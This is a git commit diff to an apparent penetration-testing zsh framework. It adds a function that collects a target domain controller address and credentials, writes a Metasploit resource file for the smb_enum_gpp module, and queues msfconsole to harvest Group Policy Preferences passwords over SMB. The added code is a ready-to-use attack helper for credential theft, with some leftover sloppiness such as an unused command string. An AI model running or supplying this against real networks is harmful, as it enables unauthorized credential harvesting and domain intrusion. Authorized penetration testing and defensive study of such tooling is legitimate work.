6897bec5604def594d9fcb07d9a9fe3712d0ebe7
Twilight4 <electrolight071@proton.me>
2024-05-05 20:14:07 +0200

    update

--- modules/nb-ad-gpp.zsh
+++ modules/nb-ad-gpp.zsh
@@ -21,3 +21,31 @@ nb-ad-gpp-install() {
     __info "Running $0..."
     __pkgs impacket
 }
+
+nb-ad-gpp-cme() {
+    __check-project
+	  __check-domain
+	  __ask "Enter the IP address of the target DC server"
+	  nb-vars-set-rhost
+    __ask "Enter a user account"
+    nb-vars-set-user
+    __ask "Enter a password for authentication"
+    nb-vars-set-pass
+
+
+
+    local cmd="use auxiliary/scanner/smb/smb_enum_gpp; set RHOST ; run; exit "
+
+    # Generate a random number for the file name
+    rand=$(shuf -i 1000-9999 -n 1)
+    rc_file="/tmp/msf_listener_$rand.rc"
+
+    echo "use auxiliary/scanner/smb/smb_enum_gpp" > "$rc_file"
+    echo "set RHOST ${__RHOST}" >> "$rc_file"
+    echo "set SMBUser ${__USER}" >> "$rc_file"
+    echo "set SMBPass ${__PASS}" >> "$rc_file"
+    echo "set SMBDomain ${__DOMAIN}" >> "$rc_file"
+    echo "exploit" >> "$rc_file"
+
+    print -z "msfconsole -n -q -r \"$rc_file\" "
+}
